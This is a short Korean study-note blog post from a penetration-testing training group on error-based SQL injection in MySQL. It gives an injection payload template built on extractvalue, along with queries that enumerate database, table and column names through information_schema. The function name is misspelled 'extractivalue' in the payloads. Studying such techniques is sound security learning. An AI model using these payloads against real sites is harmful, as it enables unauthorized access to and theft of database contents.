---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[] Error Based SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 7주차"

date: 2024-11-28
last_modified_at: 

tags: [TIL, WEB, DATABASE, SECURITY]
---

# Error Based SQL Injection
2. error 출력될 때 -> error based sqli -> 에러 메시지에 데이터를 출력
    1. 로직 에러
        -> 문법 에러는 필요가 없다 -> 실행이 안 되기 때문에(컴파일에서 죽어버려서)
    2. sql 에러
        -> php 같이 서버 앱 코드 에러 말고 sql 에러가 발생해야 함

로직 에러 발생할 수 있는 팁: 공격 포맷 만들기
mysql, oracle, mssql 모두 다름
extractvalue(xml data, 표현식) as val1
e.g. normaltic' and extractivalue('1', concat(0x3a, (select 'normaltic'))) and '1' = '1
-> 왜 보이는 거야?
-> 어떻게 작동하길래?

-> 다른 DB애서는 어떻게 할까?

---

Error Based SQL Injection
1. sql injection의 포인트를 찾는 것
' 넣어보기
-> 에러 결과가 보이느냐?
2. 에러 출력 함수 선택하기
extractvalue
3. 공격 format 만들기
normaltic' and extractivalue('1', concat(0x3a, (select 'normaltic'))) and '1' = '1
normaltic' and extractivalue('1', concat(0x3a, (___))) and '1' = '1
4. DB 이름 출력
select database()
5. table 이름 출력하기
select table_name from information_schema.tables where table_name = '' limit 0, 1
6. column 이름 출력하기
select column_name from information_schema.columns where columns_name = ''